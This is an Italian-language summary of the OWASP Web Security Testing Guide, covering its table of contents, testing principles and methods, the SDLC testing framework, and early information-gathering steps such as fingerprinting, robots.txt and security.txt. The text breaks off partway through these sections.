# OWASP Testing

La numerazione non parte da 1 perché rispecchia i contenuti elencati nelle sezioni corrispondenti del [repository di OWASP](https://github.com/OWASP/wstg/tree/master/document), per vedere la versione originale con maggiore facilità in caso a qualcuno dovesse interessare.

## 1 - Indice
* [1 - Indice](#1---indice)
* [2 - Introduzione](#2---introduzione)
* [3 - Il framework di testing di OWASP](#3---il-framework-di-testing-di-owasp)
    * [3.1 - Prima dell'inizio dello sviluppo](#a---prima-dellinizio-dello-sviluppo)
    * [3.2 - Durante la definizione e il design](#b---durante-la-definizine-e-il-design)
    * [3.3 - Durante lo sviluppo](#c---durante-lo-sviluppo)
    * [3.4 - Dopo la scrittura del programma](#d---dopo-la-scrittura-del-programma)
    * [3.5 - Durante la manutenzione](#e---durante-la-manutenzione)
* [4 - Test di sicurezza delle applicazioni web](#4---test-di-sicurezza-delle-applicazioni-web)
    * [4.1 - Raccolta delle informazioni](#a---raccolta-di-informazioni)
        * [4.1.1 - Eseguire una scansione dei motori di ricerca per individuare eventuali fughe di informazioni](#1---eseguire-una-scansione-dei-motori-di-ricerca-per-individuare-eventuali-fughe-di-informazioni)
        * [4.1.2 - Fingerprinting del Server Web](#2---fingerprinting-del-server-web)
        * [4.1.3 - Esaminare i meta-file dei server web per la fuga di informazioni](#3---esaminare-i-meta-file-dei-server-web-per-la-fuga-di-informazioni)
        * [4.1.4 - Enumerare le applicazioni sul server web](#4---enumerare-le-applicazioni-sul-server-web)
        * [4.1.5 - Esaminare il contenuto delle pagine web per verificare la presenza di perdite di informazioni](#5---esaminare-il-contenuto-delle-pagine-web-per-verificare-la-presenza-di-perdite-di-informazioni)
        * [4.1.6 - Identificare i punti di accesso dell'applicazione](#6---identificare-i-punti-di-accesso-dellapplicazione)
        * [4.1.7 - Mappare i percorsi di esecuzione attraverso l'applicazione](#7---mappare-i-percorsi-di-esecuzione-attraverso-lapplicazione)
        * [4.1.8 - Framework di fingerprinting per applicazioni web](#8---framework-di-fingerprinting-per-applicazioni-web)
        * [4.1.9 - Mappare l'architettura dell'applicazione](#9---mappare-larchitettura-dellapplicazione)
    * [4.2 - Test sulla gestione della configurazione dell'implementazione](#b---test-sulla-gestione-della-configurazione-dellimplementazione)
        * [4.2.1 - Test per la configurazione dell'infrastruttura network](#1---test-per-la-configurazione-dellinfrastruttura-network)
        * [4.2.2 - Test sulla configurazione della piattaforma di un'applicazione](#2---test-sulla-configurazione-della-piattaforma-di-unapplicazione)
        * [4.2.3 - Test sulle estensini di file che potrebbero contenere informazioni sensibili](#3---test-sulle-estensini-di-file-che-potrebbero-contenere-informazioni-sensibili)
        * [4.2.4 - Esaminare i vecchi backup e i file non referenziati per verificare la presenza di informazioni sensibili](#4---esaminare-i-vecchi-backup-e-i-file-non-referenziati-per-verificare-la-presenza-di-informazioni-sensibili)
        * [4.2.5 - Identificare interfacce e funzionalità amministratore nascoste](#5---identificare-interfacce-e-funzionalità-amministratore-nascoste)
        * [4.2.6 - Test dei metodi HTTP](#6---test-dei-metodi-http)
        * [4.2.7 - Controllare la funzionalità HTTP Strict transport Security](#7---controllare-la-funzionalità-http-strict-transport-security)
        * [4.2.8 - Permessi dei file di test](#8---permessi-dei-file-di-test)
        * [4.2.9 - Test per il Takeover di Sottodomini](#9---test-per-il-takeover-di-sottodomini)
        * [4.2.10 - Test Cloud Storage](#10---test-cloud-storage)
        * [4.2.11 - Testing for Content Security Policy](#11---testing-for-content-security-policy)
        * [4.2.12 - Test path confusion](#12---test-path-confusion)
    * [4.3 - Test di gestione dell'identità](#c---test-di-gestione-dellidentità)
        * [4.3.1 - Test di definizione dei ruoli](#1---test-di-definizione-dei-ruoli)
        * [4.3.2 - Processo di Registrazione di un Utente](#2---processo-di-registrazione-di-un-utente)
        * [4.3.3 - Processo di fornitura di un account](#3---processo-di-fornitura-di-un-account)
        * [4.3.4 - Test per l'enumeraione degli account](#4---test-per-lenumeraione-degli-account)
    * [4.4 - Test di autenticazione](#d---test-di-autenticazione)
        * [4.4.1 - Test per le credenziali di default](#1---test-per-le-credenziali-di-default)
        * [4.4.2 - Meccanismi di blocco deboli](#2---meccanismi-di-blocco-deboli)
        * [4.4.3 - Test per il bypass dello schema di autenticazione](#3---test-per-il-bypass-dello-schema-di-autenticazione)
        * [4.4.4 - Testare la vulnerabilità di 'Ricorda password'](#4---testare-la-vulnerabilità-di-ricorda-password)
        * [4.4.5 - Testare debolezze della cache del browser](#5---testare-debolezze-della-cache-del-browser)
        * [4.4.6 - Test sulla politica di 'Password Non Sicura'](#6---test-sulla-politica-di-password-non-sicura)
        * [4.4.7 - Test per le domande di sicurezza per il recupero password deboli](#7---test-per-le-domande-di-sicurezza-per-il-recupero-password-deboli)
        * [4.4.8 - Test delle funzionalità di cambio o ripristino password](#8---test-delle-funzionalità-di-cambio-o-ripristino-password)
        * [4.4.9 - Testare che non ci siano canali di autenticazione più deboli di altri](#9---testare-che-non-ci-siano-canali-di-autenticazione-più-deboli-di-altri)
        * [4.4.10 - Testare l'autenticazione multi fattoriale](#10---testare-lautenticazione-multi-fattoriale)
    * [4.5 - Test di autorizzazione](#e---test-di-autorizzazione)
        * [4.5.1 - Testing dell'inclusione di file in directory incrociate](#1---testing-dellinclusione-di-file-in-directory-incrociate)
        * [4.5.2 - Test per il bypassing dello schema di autorizzazione](#2---test-per-il-bypassing-dello-schema-di-autorizzazione)
        * [4.5.3 - Test per l'escalation dei privilegi](#3---test-per-lescalation-dei-privilegi)
        * [4.5.4 - Test per riferimenti diretti non sicuri ad oggetti](#4---test-per-riferimenti-diretti-non-sicuri-ad-oggetti)
        * [4.5.5 - Test per le vulnerabilità di OAuth](#5---test-per-le-vulnerabilità-di-oauth)
        * [4.5.6 - Test per le vulnerabilità del server di autenticazione OAuth](#6---test-per-le-vulnerabilità-del-server-di-autenticazione-oauth)
        * [4.5.7 - Test delle debolezze del client OAuth](#7---test-delle-debolezze-del-client-oauth)
    * [4.6 - Test sulla gestione della sessione](#f---test-sulla-gestione-della-sessione)
        * [4.6.1 - Test per lo schema della gestione della sessione](#1---test-per-lo-schema-della-gestione-della-sessione)
        * [4.6.2 - Test per gli attributi dei cookies](#2--test-per-gli-attributi-dei-cookies)
        * [4.6.3 - Test per Sessin Fixation](#3---test-per-sessin-fixation)
        * [4.6.4 - Test per variabili di sessione esposte](#4---test-per-variabili-di-sessione-esposte)
        * [4.6.5 - Test per il cross site forgery](#5---test-per-il-cross-site-forgery)
        * [4.6.6 - Test per le funzionalità di logout](#6---test-per-le-funzionalità-di-logout)
        * [4.6.7 - Test per il timeout della sessione](#7---test-per-il-timeout-della-sessione)
        * [4.6.8 - Test per il puzzling delle sessioni](#8---test-per-il-puzzling-delle-sessioni)
        * [4.6.9 - Test per il session hijacking](#9---test-per-il-session-hijacking)
        * [4.6.10 - Test per i JSON web token](#10---test-per-i-json-web-token)
        * [4.6.11 - Test per le sessioni concorrenti](#11---test-per-le-sessioni-concorrenti)
    * [4.7 - Test della valutazione degli input](#g---test-della-validazione-degli-input)
        * [4.7.1 - Testare per il Cross Site Scripting Riflesso](#1---testare-per-il-cross-site-scripting-riflesso)
        * [4.7.2 - Test per il cross site scripting persistente](#2---test-per-il-cross-site-scripting-persistente)
        * [4.7.3 - Testing per l'iniezione SQL](#3---testing-per-liniezione-sql)
        * [4.7.4 - Testing per MySQL](#4---testing-per-mysql)
        * [4.7.5 - Test per le iniezioni XML](#5---test-per-le-iniezioni-xml)
        * [4.7.6 - Test per l'iniezione di SSI (Server Side Includes)](#6---test-per-liniezione-di-ssi-server-side-includes)
        * [4.7.7 - Test per Xpath injection](#7---test-per-xpath-injection)
        * [4.7.8 - Test per le iniezioni IMAP/SMTP](#8---test-per-le-iniezioni-imapsmtp)
        * [4.7.9 - Test per l'iniezione di codice](#9---test-per-liniezione-di-codice)
        * [4.7.10 - Test per l'iniezione di comandi di sistema](#10---test-per-liniezione-di-comandi-di-sistema)
        * [4.7.11 - Test per iniezione di stringhe di formato](#11---test-per-iniezione-di-stringhe-di-formato)
        * [4.7.12 - Test per vulnerabilità incubate](#12---test-per-vulnerabilità-incubate)
        * [4.7.13 - Test per HTTP Splitting e Smuggling](#13---test-per-http-splitting-e-smuggling)
        * [4.7.14 - Testare le richieste HTTP in entrata](#14---testare-le-richieste-http-in-entrata)
        * [4.7.15 - Test per l'iniezione dell'intestazione Host](#15---test-per-liniezione-dellintestazione-host)
        * [4.7.16 - Test per l'iniezione di Template lato server](#16---test-per-liniezione-di-template-lato-server)
        * [4.7.17 - Test per la falsificazione delle richieste lato server](#17---test-per-la-falsificazione-delle-richieste-lato-server)
        * [4.7.18 - Test per assegnamenti di massa](#18---test-per-assegnamenti-di-massa)
    * [4.8 - Test sulla gestione dell'errore](#h---test-sulla-gestione-dellerrore)
        * [4.8.1 - Test per la gestione errata dell'errore](#1---test-per-la-gestione-errata-dellerrore)
    * [4.9 - Test per una crittografia debole](#i---test-per-una-crittografia-debole)
        * [4.9.1 - Test per una sicurezza inadeguata nel TLS (Transport Layer Security)](#1---test-per-una-sicurezza-inadeguata-nel-tls-transport-layer-security)
        * [4.9.2 - Testing for Padding Oracle](#2---testing-for-padding-oracle)
        * [4.9.3 - Test per informazioni sensibili inviate in canali non criptati](#3---test-per-informazioni-sensibili-inviate-in-canali-non-criptati)
        * [4.9.4 - Test per crittografia debole](#4---test-per-crittografia-debole)
    * [4.10 - Test della logica aziendale](#j---test-della-logica-aziendale)
        * [4.10.1 - Introduzione alla logica aziendale](#1---introduzione-alla-logica-aziendale)
        * [4.10.2 - Test di validazione della logica aziendale](#2---test-di-validazione-della-logica-aziendale)
        * [4.10.3 - Testare l'abilità nel forgiare richieste](#3---testare-labilità-nel-forgiare-richieste)
        * [4.10.4 - Controlli di integrità dei test](#4---controlli-di-integrità-dei-test)
        * [4.10.5 - Test per il timing dei processi](#5---test-per-il-timing-dei-processi)
        * [4.10.6 - Limiti del numero di volte che una funzione può essere utilizzata](#6---limiti-del-numero-di-volte-che-una-funzione-può-essere-utilizzata)
        * [4.10.7 - Test per l'elusione dei flussi di lavoro](#7---test-per-lelusione-dei-flussi-di-lavoro)
        * [4.10.8 - Caricamento di tipi di file inaspettati](#8---caricamento-di-tipi-di-file-inaspettati)
        * [4.10.9 - Test per l'upload di dati maligni](#9---test-per-lupload-di-dati-maligni)
        * [4.10.10 - Test per le funzionalità di pagamento](#10---test-per-le-funzionalità-di-pagamento)
    * [4.11 - Test lato client](#k---test-lato-client)
        * [4.11.1 - Test per il Cross Site basato sul DOM](#1---test-per-il-cross-site-basato-sul-dom)
        * [4.11.2 - Test per l'esecuzione di Javascript](#2---test-per-lesecuzione-di-javascript)
        * [4.11.3 - Test per l'iniezione di HTML](#3---test-per-liniezione-di-html)
        * [4.11.4 - Test per il Redirect URL lato client](#4---test-per-il-redirect-url-lato-client)
        * [4.11.5 - Test per le iniezioni CSS](#5---test-per-le-iniezioni-css)
        * [4.11.6 - Test per la manipolazione delle risorse client side](#6---test-per-la-manipolazione-delle-risorse-client-side)
        * [4.11.7 - Test per il Cross Origin Resource Sharing (CORS)](#7---test-per-il-cross-origin-resource-sharing-cors)
        * [4.11.8 - Test per il Cross Site Flashing](#8---test-per-il-cross-site-flashing)
        * [4.11.9 - Test per il clickjacking](#9---test-per-il-clickjacking)
        * [4.11.10 - Test sulle WebSockets](#10---test-sulle-websockets)
        * [4.11.11 - Testing Web Messaging](#11---testing-web-messaging)
        * [4.11.12 - Testare la memoria del browser](#12---testare-la-memoria-del-browser)
        * [4.11.13 - Test per l'inclusione del Cross Site Scripting](#13---test-per-linclusione-del-cross-site-scripting)
        * [4.11.14 - Test per il reverse tabnabbing](#14---test-per-il-reverse-tabnabbing)
    * [4.12 - API testing](#l---api-testing)
        * [4.12.1 - Panoramica del testing delle API](#1---panoramica-del-testing-delle-api)
        * [4.12.2 - Riconoscimento delle API](#2---riconoscimento-delle-api)
        * [4.12.3 - Testare GraphQL](#3---testare-graphql)
* [5 - Reporting](#5---reporting)
    * [5.1 - Struttura del report](#a---struttura-del-report)
        * [5.1.1 - Introduzione](#1---introduzione)
        * [5.1.2 - Riepilogo esecutivo](#2---riepilogo-esecutivo)
        * [5.1.3 - Scoperte](#3---scoperte)
    * [5.2 - Schemi di nomenclatura delle vulnerabilità](#b---schemi-di-nomenclatura-delle-vulnerabilità)
        * [5.2.1 - Come denominare le vulnerabilità](#1---come-denominare-le-vulnerabilità)

## 2 - Introduzione
Il progetto OWASP Testing ha fornito un quadro di test completo, che va oltre una semplice lista di controllo o una serie di prescrizioni sui problemi. Fornire semplicemente una lista di controllo sarebbe inadeguato, poiché un approccio unico lascerebbe inevitabilmente numerose vulnerabilità nel software a causa della sua necessaria generalità.

La figura seguente illustra un modello generico di ciclo di vita dello sviluppo del software (SDLC), insieme ai costi crescenti (stimati) associati alla correzione dei bug di sicurezza all'interno di tale modello:

![SDLC Model and Cost of Fixing Security Bugs](./img/SDLC.jpg)

Un programma di test efficace dovrebbe avere componenti che testano quanto segue:
* Persone - per garantire un'adeguata educazione e consapevolezza;
* Processo - per garantire che ci siano politiche e standard adeguati e che le persone sappiano come seguirli;
* Tecnologia - per garantire che il processo sia stato efficace nella sua attuazione.

<br>

**PRINCIPI DI TESTING**
- Sebbene si sia tentati di pensare che uno scanner di sicurezza o un firewall per applicazioni fornisca molte difese contro gli attacchi o identifichi una moltitudine di problemi, in realtà non esiste una pallottola d'argento per risolvere il problema del software insicuro.
- Il modello “patch-and-penetrate” (correzione di un bug segnalato, ma senza un'adeguata indagine della causa principale) non è un'opzione valida: ci vuole tempo per risolvere i problemi e pubblicare le patch (dando per scontato che i clienti effettivamente le installeranno).
- Integrando la sicurezza in ogni fase dell'SDLC, ogni fase presenta considerazioni sulla sicurezza che dovrebbero diventare parte del processo esistente, per garantire un programma di sicurezza completo ed efficace dal punto di vista dei costi.
- Testare presto e testare spesso: un passo fondamentale per rendere possibile tutto ciò è la formazione dei team di sviluppo.

<br>

**PASSI DA FARE**
- Alle risorse da proteggere deve essere assegnata una classificazione che indichi come devono essere gestite (ad esempio, riservate, segrete, top secret).
- Per testare con successo un'applicazione alla ricerca di vulnerabilità di sicurezza è necessario pensare “fuori dagli schemi”. I normali casi d'uso verificano il normale comportamento dell'applicazione quando un utente la utilizza nel modo previsto. Un buon test di sicurezza richiede di andare oltre ciò che ci si aspetta e di pensare come un aggressore che sta cercando di violare l'applicazione. Uno dei motivi per cui gli strumenti automatici non riescono a verificare le vulnerabilità è che gli strumenti automatici non pensano in modo creativo.
- Una delle prime iniziative importanti in un buon programma di sicurezza dovrebbe essere quella di richiedere una documentazione accurata dell'applicazione. L'architettura, i diagrammi di flusso dei dati, i casi d'uso, ecc. dovrebbero essere registrati in documenti formali e resi disponibili per la revisione. Le specifiche tecniche e i documenti dell'applicazione dovrebbero includere informazioni che elencano non solo i casi d'uso desiderati, ma anche eventuali casi d'uso specificamente vietati. Infine, è utile avere almeno una base di infrastruttura di sicurezza che consenta il monitoraggio e l'analisi delle tendenze degli attacchi contro le applicazioni e la rete di un'organizzazione (ad esempio, sistemi di rilevamento delle intrusioni).
- L'uso di strumenti di sicurezza open source può essere un punto di partenza, poiché può accelerare di molto le attività di routine.
- Non affrettate la revisione dell'applicazione, potrebbe dare un falso senso di fiducia verso quella parte di codice.
- Non limitatevi a testare con un metodo black-box, ma date un'occhiata al codice e cercate di individuare qualche falla.
- Un firewall non vi toglie la responsabilità di costruire buoni test, ma se lo fate, un firewall non può farvi male per una maggiore sicurezza.
- Tenete traccia dei problemi di sicureza per capire se questi diminuiscono o aumentano, se il team ha bisogno di un retraining, ecc...
- È importante produrre una registrazione formale di quali azioni di test sono state intraprese, da chi, quando sono state eseguite e i dettagli dei risultati dei test. Il rapporto deve anche consentire a un altro tester di sicurezza di riprodurre i risultati.

**Metodi di test spiegati**
- Ispezione manuale —> Le ispezioni manuali implicano principalmente le implicazioni alla sicurezza dovute a persone, politiche interne all'azienda o processi seguiti. Questa piò anche includere una revisione all'architettura generale. Di solito sono effettuate controllando la documentazione o facendo domande agli sviluppatori per trovare le falle evidenti nella logica.
    
    **Vantaggi**

    * Non richiede alcuna tecnologia di supporto
    * Si adatta a diverse situazioni
    * Flessibile
    * Promuove il lavoro di squadra
    * Avviene presto nel SDLC

	**Svantaggi**

    * Può impiegare molto tempo
    * Per essere efficace richiede molta bravura da parte del tester

	
<br>

- Modellazione delle minacce -> I modelli delle minacce devono essere creati il più presto possibile nell'SDLC e devono essere rivisti man mano che l'applicazione si evolve e lo sviluppo procede. Consente al progettista di sviluppare strategie di mitigazione. Il modello delle minacce prevede:
    * Decomposizione dell'applicazione: utilizzare un processo di ispezione manuale per capire come funziona l'applicazione
    * Definire e classificare le attività - classificare le attività in tangibili e non e classificarle in base all'importanza aziendale.
    * Esplorare le potenziali vulnerabilità, siano esse tecniche (bug del codice), operative (processi inadeguati) o manageriali (gestione inefficace della sicurezza).
    * Esplorare le potenziali minacce - sviluppare una visione realistica dei potenziali vettori di attacco dal punto di vista di un attaccante, utilizzando scenari di minaccia o alberi di attacco.

        ![Esempio di albero di attacco](./img/An-example-attack-tree.png)

    * Creare strategie di mitigazione - sviluppare controlli di mitigazione per ciascuna delle minacce ritenute realistiche.
	**Vantaggi**

    * Visione materiale dei vettori di attacco
    * Flessibile
    * Avviene presto nel SDLC

	**Svantaggi**
    * Una buona modellazione delle minacce non implica un buon software

    <br>


- Revisione del codice sorgente

	**Vantaggi**
    * Completezza ed efficienza
    * Accuratezza
    * Velocità (per tester competenti)

	**Svantaggi**
    * Servono tester esperti
    * Può non trovare errori nelle librerie usate
    * Può non trovare errori facilmente errori a runtime
    * Il codice sorgente analizzato può differire da quello esposto al pubblico

    <br>

- Penetration Testing --> È anche comunemente noto come black-box testing o ethical hacking. Il test di penetrazione è essenzialmente l'“arte” di testare un sistema o un'applicazione in remoto per trovare vulnerabilità di sicurezza, senza conoscere il funzionamento interno dell'obiettivo stesso.

	**Vantaggi**
    * Può essere veloce (e quindi economico)
    * Richiede meno bravuta della revisione del codice
    * Testa il codice che effettivamente viene esposto al pubblico

	**Svantaggi**
    * Troppo tardi nel SDLC
    * Test unicamente ad impatto frontale

Tutte le tecniche dovrebbero essere utilizzate in tutte le aree che necessitano di test. Le aziende adottano un solo approccio. L'unico approccio utilizzato è stato storicamente il test di penetrazione. È semplicemente “troppo poco e troppo tardi” nell'SDLC.

Si raccomanda che un framework di test equilibrato abbia un aspetto simile a questo:
![SDLC Test Proportion](./img/ProportionSDLC.png)

![Testing techniques](./img/ProportionTest.png)

È utile comprendere l'efficacia e i limiti degli strumenti di rilevamento automatico delle vulnerabilità. A tal fine, l'[OWASP Benchmark Project](https://owasp.org/www-project-benchmark/) è una suite di test progettata per valutare la velocità, la copertura e l'accuratezza degli strumenti e dei servizi automatizzati di rilevamento delle vulnerabilità del software.

L'analisi statica del codice sorgente da sola non è in grado di identificare i problemi dovuti a difetti di progettazione, poiché non è in grado di comprendere il contesto in cui il codice è costruito. Gli strumenti di analisi del codice sorgente sono utili per determinare i problemi di sicurezza dovuti a errori di codifica.

<br> 

**Derivare i requisiti per i test funzionali (relativi all'applicazione) e non funzionali (relativi alla soddisfazione dell'utente con il prodotto).**
- Requisiti di sicurezza funzionali --> Dichiarano la funzionalità attesa che può essere convalidata attraverso i test (ad esempio, “l'applicazione blocca l'utente dopo sei tentativi di accesso falliti” o “le password devono avere un minimo di dieci caratteri alfanumerici”). 
- Requisiti di sicurezz guidati dai rischi —> Devono validare l'applicazione per comportamenti inaspettati o requisiti negativi (ad esempio, l'applicazione non deve consentire la modifica o la distruzione dei dati, né deve essere compromessa per transazioni finanziarie non autorizzate da parte di utenti malintenzionati). 

<br>

**Derivare i test di sicurezza dai casi di uso e misuso**

Una premessa per descrivere le funzionalità dell'applicazione è comprendere cosa l'applicazione dovrebbe fare e come. Questo può essere fatto attraverso la descrizione dei casi d'uso. I casi d'uso aiutano a identificare gli attori nell'applicazione, le loro relazioni, la sequenza di azioni prevista per ogni scenario, azioni alternative, requisiti speciali, precondizioni e post-condizioni.

Similmente ai casi d'uso, i casi di uso improprio o abuso descrivono scenari di utilizzo non intenzionato e malevolo dell'applicazione. Questi casi di uso improprio forniscono un modo per descrivere scenari in cui un attaccante potrebbe abusare dell'applicazione. La chiave è descrivere tutti gli scenari possibili o, almeno, quelli più critici di utilizzo e uso improprio.
- Descrivere lo Scenario Funzionale: L'utente si autentica fornendo un nome utente e una password. L'applicazione concede accesso agli utenti in base all'autenticazione delle credenziali e fornisce errori specifici all'utente quando la validazione fallisce.
- Descrivere lo Scenario Negativo: Un attaccante compromette l'autenticazione attraverso un attacco di forza bruta o un attacco a dizionario delle password e vulnerabilità di raccolta degli account nell'applicazione.
- Descrivere Scenari Funzionali e Negativi con Casi di Uso e Uso Improprio: Rappresentando graficamente le minacce alle azioni degli utenti (abusi), è possibile derivare le contromisure come azioni dell'applicazione che mitigano tali minacce.

![Example of use and misuse case diagram](./img/640px-UseAndMisuseCase.png)

<br>

**Analisi e Reporting dei Dati dei Test di Sicurezza**
È possibile tenere traccia del numero di vulnerabilità trovate per poter andare in produzione solo una volta che sono state ridotte a un numero accettabile.

<br>

## 3 - Il framework di testing di OWASP
Questo framework non dovrebbe essere considerato prescrittivo, ma come un approccio flessibile che può essere esteso e modellato per adattarsi al processo di sviluppo e alla cultura dell'organizzazione.

### A - Prima dell'inizio dello sviluppo
* Definire un SDLC
* Assicurarsi che siano in atto politiche, standard e documentazione appropriati. La documentazione è estremamente importante poiché fornisce ai team di sviluppo linee guida e politiche da seguire. Le persone possono fare la cosa giusta solo se sanno quale sia la cosa giusta. Se l'applicazione deve essere sviluppata in Java, è essenziale che ci sia uno standard di codifica sicura per Java. Se l'applicazione utilizza la crittografia, è fondamentale avere uno standard di crittografia. Nessuna politica o standard può coprire ogni situazione che il team di sviluppo dovrà affrontare. Documentando le questioni comuni e prevedibili, si ridurranno le decisioni che devono essere prese durante il processo di sviluppo.
* Prima che inizi lo sviluppo, pianificare il programma di misurazione. Definendo i criteri da misurare, si fornisce visibilità sui difetti sia nel processo che nel prodotto.


### B - Durante la definizine e il design
* Rivedere i requisiti di sicurezza e assicurarsi che siano il più chiari possibile. 
* Le applicazioni devono avere un design e un'architettura documentati. Identificare le vulnerabilità di sicurezza nella fase di progettazione è uno dei luoghi più convenienti per rilevare i difetti e può essere anche uno dei più efficaci per apportare modifiche. (Ad esempio, se si identifica che il design prevede decisioni di autorizzazione in più punti, potrebbe essere opportuno considerare un componente di autorizzazione centrale. Se l'applicazione esegue la validazione dei dati in più punti, potrebbe essere opportuno sviluppare un framework di validazione centrale (cioè risolvere la validazione degli input in un unico punto, anziché in centinaia di punti, è molto più economico).)
* Una volta completati il design e l'architettura, costruire modelli in Linguaggio di Modellazione Unificato (UML) che descrivano il funzionamento dell'applicazione.
* Sviluppare scenari di minaccia realistici. Analizzare il design e l'architettura per garantire che queste minacce siano state mitigate, accettate dall'azienda o assegnate a una terza parte, come un'agenzia assicurativa. Quando le minacce identificate non hanno strategie di mitigazione, rivedere il design e l'architettura con l'architetto dei sistemi per modificare il design.

### C - Durante lo sviluppo
Teoricamente, lo sviluppo è l'implementazione di un progetto. Tuttavia, nel mondo reale, molte decisioni progettuali vengono prese durante lo sviluppo del codice.

* Il team di sicurezza dovrebbe eseguire una revisione del codice con gli sviluppatori e, in alcuni casi, con gli architetti di sistema. Lo scopo non è quello di effettuare una revisione del codice, ma di comprendere a un livello alto il flusso, il layout e la struttura del codice che compone l'applicazione.
* Il team di sicurezza, avendo maggiore esperienza nel campo (e ora comprendendo perché certe cose siano state codificate in quel modo), può fornire agli architetti e agli sviluppatori alcuni suggerimenti che potrebbero rendere il codice molto più sicuro fin dall'inizio.

### D - Dopo la scrittura del programma
* I passaggi precedenti potrebbero aver ridotto il numero di errori possibili al minimo, ma per garantire la sicurezza è sempre una buona pratica effettuare dei test di penetrazione.

### E - Durante la manutenzione
* Dovrebbero essere effettuati controlli mensili o trimestrali sia sull'applicazione che sull'infrastruttura per garantire che non siano stati introdotti nuovi rischi di sicurezza e che il livello di sicurezza sia ancora intatto.
* Dopo che ogni modifica è stata approvata e testata nell'ambiente di QA e distribuita nell'ambiente di produzione, è fondamentale verificare che il livello di sicurezza non sia stato influenzato dalla modifica. Questo dovrebbe essere integrato nel processo di gestione delle modifiche.

Un Flusso di Lavoro Tipico per il Test SDLC
![Typical testing workflow](./img/Typical_SDLC_Testing_Workflow.gif)

<br> 

## 4 - Test di sicurezza delle applicazioni web
Questa sezione descrive la metodologia di testing della sicurezza delle applicazioni web secondo OWASP e spiega come verificare la presenza di vulnerabilità all'interno dell'applicazione a causa di carenze nei controlli di sicurezza identificati.

**Testing Passivo** —> Durante il testing passivo, un tester cerca di comprendere la logica dell'applicazione ed esplora l'applicazione come un utente finale. Ad esempio, un tester può trovare una pagina al seguente URL: https://www.example.com/login/auth_form. I seguenti parametri rappresentano due punti di accesso all'applicazione: https://www.example.com/appx?a=1&b=1. In questo caso, l'applicazione ha due punti di accesso (i parametri a e b). Tutti i punti di input trovati in questa fase rappresentano obiettivi per il testing attivo.

**Testing attivo** —> Il set di test attivi sono stati divisi in 12 categorie elencate qua sotto

### A - Raccolta di informazioni
#### 1 - Eseguire una scansione dei motori di ricerca per individuare eventuali fughe di informazioni
Poiché esistono molti modi per raccogliere automaticamente informazioni private da siti casuali attraverso i bot, è bene assicurarsi periodicamente che non ci sia modo di ottenere informazioni private (come diagrammi e configurazioni di rete; messaggi ed e-mail archiviati da amministratori o altro personale chiave; procedure di accesso e formati dei nomi utente; nomi utente, password e chiavi private; file di configurazione di terze parti o di servizi cloud; contenuti di messaggi di errore rivelatori; applicazioni non pubbliche (versioni di sviluppo, di test, di User Acceptance Testing (UAT) e di staging dei siti)) né sul mio sito né tramite link da altri siti. È opportuno verificare queste informazioni su vari motori di ricerca. In Google, ad esempio, è possibile utilizzare nella barra di ricerca parole come site: inure: entitle: intext: filetype: cache: seguite da una parola o da una frase per controllare tutti i siti che la presentano nel corpo o nel titolo. 

#### 2 - Fingerprinting del Server Web
Il web fingerprinting è un’azione che si può effettuare con alcuni strumenti come Nmap, WhatWeb, Wappalyzer, Netcraft, Nikto e Nmap. Questi strumenti inviano richieste HTTP al server e, in base alle risposte ricevute (messaggi di errore, codici di stato, intestazioni, ecc.), si può capire su quale server è in esecuzione il sito analizzato. La vulnerabilità del sito in questione non è dovuta solamente al sito stesso, ma può essere influenzata anche dal server che lo ospita; conoscerlo può aiutare a prevenire certi tipi di attacchi. Per questa ragione, è consigliato adottare alcune precauzioni. Queste azioni includono:
* Offuscare le informazioni del server web nelle intestazioni, ad esempio utilizzando il [mod_headers di Apache](https://httpd.apache.org/docs/current/mod/mod_headers.html).
* Usare un [server reverse proxy](https://en.wikipedia.org/wiki/Proxy_server#Reverse_proxies) rinforzato per creare un ulteriore strato di sicurezza tra il server web e Internet. Un reverse proxy è un server che si interpone tra un client (come un browser) e uno o più server di backend. La sua funzione principale è quella di ricevere le richieste dal client e inoltrarle al server appropriato, quindi restituire la risposta al client. Tra le varie motivazioni per usarlo ce ne sono alcune di sicurezza come il mascheramento dell'indirizzo ip di un server o i suoi dettagli di backend.
* Assicurarsi che i server web siano sempre aggiornati con l'ultima versione del software e le patch di sicurezza.

**Rimedio**
* Fai attenzione alla compilazione del file 'robots.txt' in modo che i motori di ricerca sappiano cosa indicizzare o meno 

#### 3 - Esaminare i meta-file dei server web per la fuga di informazioni
Ci sono strumenti come ZAP e Burp Suite che tentano di ricreare cosa farebbero spider e crawler (Bot che aprono siti e gli hyperlink uscenti da essi in cerca di pagine con scopo di indicizzazione), sono chiamati DAST (Dynamic Application Security Testing).
* Robot —> IN QUESTO CAPITOLO SI PRESUPPONE CHE STIAMO PARLANDO DI "BUONI SPIDER" (SPIDER CHE SEGUIRANNO LE ISTRUZIONI FORNITE NEL "ROBOTS.TXT"). 
    I web spider, robot o crawler recuperano una pagina web e poi attraversano ricorsivamente i collegamenti ipertestuali per recuperare ulteriori contenuti web. Il loro comportamento accettato è specificato dal Protocollo di Esclusione dei Robot del file robots.txt nella directory principale del web. Per evitare certi tipi di ricerche, è sufficiente vietare alcune delle directory.

        User-agent: *
        Disallow: /search
        Allow: /search/about
        Allow: /search/static
        Allow: /search/howsearchworks
        Disallow: /sdch
    

#### 4 - Enumerare le applicazioni sul server web
I web spider/robot/crawler possono ignorare intenzionalmente le direttive Disallow specificate in un file robots.txt. Pertanto, il file robots.txt non dovrebbe essere considerato un meccanismo per imporre restrizioni su come i contenuti web vengono accessibili, memorizzati o ripubblicati da terzi.
* **Meta tag** — Se non è presente un tag `<META NAME="ROBOTS">`, il protocollo di esclusione dei robot assume per default le impostazioni `INDEX, FOLLOW`. Questo significa che, di norma, il contenuto della pagina verrà indicizzato e i collegamenti saranno seguiti. Se si vogliono impedire l'indicizzazione o il seguire i collegamenti, si possono usare i prefissi `NO`, come in `NOINDEX` e `NOFOLLOW`. Quando un motore di ricerca analizza una pagina, effettua una ricerca per il tag `<META NAME="ROBOTS">` e confronta il risultato con il file `robots.txt` presente alla radice del sito. Questo file specifica le regole su quali parti del sito possono essere visitate dai robot.
* **Security.txt** — È un file utilizzato per definire le politiche di sicurezza e i contatti per il servizio clienti. Viene solitamente posizionato nella root o nella directory `.well-known/`, ad esempio `https://example.com/security.txt` o `https://example.com/.well-known/security.txt`.

    <br>

        $ wget --no-verbose https://www.linkedin.com/.well-known/security.txt && cat security.txt
        2020-05-07 12:56:51 URL:https://www.linkedin.com/.well-known/security.txt [333/333] -> "security.txt" [1]
        # Conforms to IETF `draft-foudil-securitytxt-07`
        Contact: mailto:security@linkedin.com
        Contact: https://www.linkedin.com/help/linkedin/answer/62924
